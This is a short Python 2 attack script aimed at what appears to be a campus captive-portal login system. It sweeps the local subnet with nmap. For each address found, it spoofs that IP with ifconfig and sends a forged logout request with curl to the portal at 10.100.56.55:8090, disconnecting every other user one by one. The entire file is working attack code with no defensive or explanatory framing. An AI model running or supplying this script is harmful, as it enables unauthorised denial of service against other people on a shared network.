import os, sys
from time import sleep

def logoutPeople(ip):
	os.system('ifconfig eth0 ' + ip)
	logoutCommand = "curl -k 'https://10.100.56.55:8090/logout.xml' -H 'Host: 10.100.56.55:8090' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.1' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Referer: https://10.100.56.55:8090/httpclient.html' -H 'Connection: keep-alive' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data 'mode=193&username=201301111&a=1446643217971&producttype=0'"
	result = os.system(logoutCommand + ' > /dev/null')

os.system("ifconfig eth0 | grep 'inet addr' | awk {'print $2'} | cut -d ':' -f 2 > temp") 
f = open('temp', 'r')
myIP = f.readline()
print 'This laptop\'s IP is', myIP,
f.close()
os.system('rm temp')

os.system("nmap -sn "+ myIP +"/24 | grep 10.100 | awk {'print $5'} > all_ips.txt")
totalIPs = os.system('wc -l all_ips.txt')
print 'Obtained all', totalIPs, 'ips'

f = open('all_ips.txt', 'r')
for line in f.readlines():
	print 'Logging',line.rstrip(),'out'
	logoutPeople(line)
	sleep(1)
	print 'Logged out ', line.rstrip()